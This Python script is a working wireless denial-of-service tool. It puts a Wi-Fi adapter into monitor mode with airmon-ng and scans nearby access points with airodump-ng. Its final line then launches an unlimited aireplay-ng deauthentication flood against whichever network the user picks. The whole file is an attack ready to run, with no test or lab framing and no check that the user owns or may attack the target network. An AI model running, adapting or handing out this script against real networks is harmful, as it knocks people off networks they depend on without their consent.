import subprocess
import re
import csv
import os
import time
import shutil
from datetime import datetime

active_networks = []

def check_network_presence(essid, lst):
    status = True

    if len(lst) == 0:
        return status

    for item in lst:
        if essid in item["ESSID"]:
            status = False

    return status

if not 'SUDO_UID' in os.environ.keys():
    print("Please run this script with elevated privileges (sudo).")
    exit()

for file_name in os.listdir():
    if ".csv" in file_name:
        print("Moving detected .csv files to a backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder already exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

wifi_pattern = re.compile("^wlan[0-9]+")

check_wifi_result = wifi_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

print("Available WiFi interfaces:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

while True:
    interface_choice = input("Select the WiFi interface for the operation: ")
    try:
        if check_wifi_result[int(interface_choice)]:
            break
    except:
        print("Invalid input. Please enter a valid number.")

selected_interface = check_wifi_result[int(interface_choice)]

print("WiFi adapter connected! Now terminating conflicting processes.")

kill_conflicts =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Setting WiFi adapter into monitor mode:")
set_monitor_mode = subprocess.run(["sudo", "airmon-ng", "start", selected_interface])

capture_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", selected_interface + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_file:
                        csv_file.seek(0)
                        csv_reader = csv.DictReader(csv_file, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_network_presence(row["ESSID"], active_networks):
                                active_networks.append(row)

        print("Scanning. Press Ctrl+C to select the network to proceed with.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        for index, item in enumerate(active_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make a selection.")

while True:
    choice = input("Select a network to proceed with: ")
    try:
        if active_networks[int(choice)]:
            break
    except:
        print("Invalid input. Please try again.")

target_bssid = active_networks[int(choice)]["BSSID"]
target_channel = active_networks[int(choice)]["channel"].strip()

subprocess.run(["airmon-ng", "start", selected_interface + "mon", target_channel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", target_bssid, check_wifi_result[int(interface_choice)] + "mon"])
